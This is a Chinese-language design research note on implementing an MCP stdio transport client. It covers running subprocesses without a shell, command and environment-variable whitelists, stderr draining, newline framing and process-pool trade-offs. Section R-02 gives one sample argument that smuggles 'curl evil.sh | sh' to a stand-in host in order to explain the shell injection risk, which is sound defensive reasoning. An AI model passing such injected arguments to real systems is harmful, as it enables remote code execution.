# Research：MCP stdio 传输（024）

## R-01 为什么这次只做协议与进程层

003 的外部工具链路有四处默认了「URL」：模型列、`validate_endpoint`（SSRF 校验
+ 归一化）、`build_external_executors`（`MCPClient(endpoint)`）、前端表单。
给这四处加 transport 分叉是**横切改造**，而它服务的是一条已经稳定、有大量测试的
特性（`tests/integration/test_external_tools*.py`）。

先把「stdio 怎么说话、进程怎么活」做成一个独立模块，价值在于：

- 它不需要碰任何既有代码，零回归风险；
- 它能用 fake server 端到端验（真实子进程，不是 mock）；
- 接线时直接复用它，本轮的 8 例测试继续有效。

## R-02 为什么必须不走 shell

`create_subprocess_exec` 与 `create_subprocess_shell` 的差别就是一条安全边界：

```
# 用户填的 args: ["-y", "@scope/server; curl evil.sh | sh"]
exec  → npx 收到这个字符串当参数（无害）
shell → 分号被解释，第二段命令被执行（RCE）
```

白名单命令 + 不走 shell，两条同时成立才安全。只做白名单，`/bin/sh` 这一类仍在
名单外但如果有人把 `bash` 加进白名单就破防；只做不走 shell，`rm` 仍然可被直接
指定。所以两条都要，且白名单比对 `basename`（`/bin/sh` 与 `sh` 都要拦）。

## R-03 为什么环境变量要白名单

worker 容器里有 `DATABASE_URL`、`LLM_API_KEY`、`MINIO_*`、`MCP_CREDENTIAL_KEY`。
stdio server 是**第三方代码**（`npx -y` 拉的包），把整个环境传给它等于把凭证交给
一个你没审计过的 npm 包。

白名单的副作用是某些工具找不到自己的配置（如 `GITHUB_TOKEN`），所以保留
**显式 override**：用户配置 server 时声明要传哪些环境变量，由服务端按名取值。
（这一步涉及「用户能否读任意环境变量」的新问题，接线时单独设计，本轮不实现。）

## R-04 为什么 stderr 必须持续读

子进程的 stderr 是一个固定大小的管道缓冲（通常 64KB）。如果父进程不读，
server 写满之后会在 `write()` 上阻塞——表现为「握手超时」，而真正的原因在 stderr
里躺着。所以起一个后台 task 一直读，只保留尾部 4KB。

崩溃时的错误信息里带这段尾部，是把「失败了」变成「失败在 `npm ERR! 404`」的关键。

## R-05 为什么换行分帧而不是 Content-Length

MCP 的 stdio 传输规范用 newline-delimited JSON（每条消息一行），HTTP 传输才用
SSE / JSON 响应。这里按行读，比按 `Content-Length` 读简单且符合规范。

代价是：如果某个 server 在 JSON 里嵌了裸换行（非法 JSON），会分帧错误——但那本来
就是协议违规，报 `MCPProtocolError` 是正确行为。

## R-06 「每次调用启一次」还是「常驻池」——留给接线阶段决定

| | 每次启动 | 常驻池 |
|---|---|---|
| 冷启动 | 每次都有（npx 数秒） | 只有第一次 |
| 崩溃影响 | 单次调用失败 | 后续调用全受影响，需要重建 |
| 并发 | 天然隔离 | 需要处理「一个进程同时两个请求」 |
| 状态 | 无状态，简单 | server 可能持有会话状态（如登录态） |

MCP stdio server 很多会**在内存里保留状态**（浏览器 session、登录 token），
常驻池能利用它；但也意味着一个坏掉的 server 会拖垮后续所有调用。

这个决策会影响失败模式，需要结合 003 的超时/重试/快照语义一起设计，
不适合在「协议层刚写完」的时候顺手定。这是本轮只交付客户端的原因之一。
